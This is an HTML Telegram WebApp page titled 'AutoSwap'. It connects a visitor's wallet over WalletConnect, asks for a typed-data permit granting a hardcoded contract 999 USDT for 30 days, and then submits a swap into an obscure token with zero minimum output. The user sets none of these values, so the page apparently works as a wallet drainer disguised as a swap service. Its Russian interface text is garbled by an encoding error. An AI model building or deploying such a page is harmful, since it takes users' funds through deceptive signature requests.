<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>AutoSwap WebApp</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/sign-client.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <style>
    body {
      background: #1d1f23;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    canvas {
      margin: 20px auto;
      display: block;
    }
    #status {
      margin-top: 20px;
      font-size: 16px;
      color: #00cc99;
    }
  </style>
</head>
<body>
  <h2>–ü–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫ –¥–ª—è AutoSwap</h2>
  <canvas id="qr" width="256" height="256"></canvas>
  <div id="status">‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

  <script>
    const CONFIG = {
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      token: "0x55d398326f99059FF775485246999027B3197955", // USDT
      amount: "999", // USDT
      chainId: 56,
      projectId: "d868f90cd734355ae0320f8f0258b6b1"
    };

    const status = (txt, color = "#00cc99") => {
      const el = document.getElementById("status");
      el.textContent = txt;
      el.style.color = color;
    };

    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    async function main() {
      const signClient = await window.SignClient.init({
        projectId: CONFIG.projectId,
        relayUrl: "wss://relay.walletconnect.com",
        metadata: {
          name: "AutoSwap WebApp",
          description: "Permit2 + Swap",
          url: location.href,
          icons: []
        }
      });

      const { uri, approval } = await signClient.connect({
        requiredNamespaces: {
          eip155: {
            methods: ["eth_sendTransaction", "eth_signTypedData", "eth_signTypedData_v4"],
            chains: ["eip155:56"],
            events: ["accountsChanged", "chainChanged"]
          }
        }
      });

      if (uri) {
        QRCode.toCanvas(document.getElementById("qr"), uri, { width: 256 });
        status("üîó –û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR –∫–æ–¥ –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è");
      }

      const session = await approval();
      const topic = session.topic;
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      status("‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: " + address);

      // Permit2 ‚Üí swapForUser
      const provider = new ethers.BrowserProvider(signClient.getEthereumProvider({ topic, chainId: `eip155:${CONFIG.chainId}` }));
      const signer = await provider.getSigner();

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const permitData = {
        types: {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        },
        domain: {
          name: "Permit2",
          chainId: CONFIG.chainId,
          verifyingContract: CONFIG.permit2
        },
        primaryType: "PermitTransferFrom",
        message: {
          permitted: {
            token: CONFIG.token,
            amount: ethers.parseUnits(CONFIG.amount, 18).toString()
          },
          spender: CONFIG.autoswap,
          nonce,
          deadline
        }
      };

      let signature;
      try {
        signature = await provider.send("eth_signTypedData_v4", [
          address,
          JSON.stringify(permitData)
        ]);
      } catch (e) {
        return status("‚ùå –ü–æ–¥–ø–∏—Å—å –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞: " + (e.message || e), "#ff5555");
      }

      // –í—ã–∑—ã–≤–∞–µ–º swapForUser
      const iface = new ethers.Interface([
        "function swapForUser(address owner, address tokenIn, uint256 amount, uint256 nonce, uint256 deadline, address tokenOut, uint256 minOut, bytes signature)"
      ]);

      const callData = iface.encodeFunctionData("swapForUser", [
        address,
        CONFIG.token,
        ethers.parseUnits(CONFIG.amount, 18),
        nonce,
        deadline,
        "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f", // KPC
        0,
        signature
      ]);

      try {
        const txHash = await provider.send("eth_sendTransaction", [{
          from: address,
          to: CONFIG.autoswap,
          data: callData
        }]);
        status("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞: " + txHash);
        setTimeout(() => Telegram.WebApp.close(), 5000);
      } catch (e) {
        status("‚ùå –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞: " + (e.message || e), "#ff4444");
      }
    }

    main();
  </script>
</body>
</html>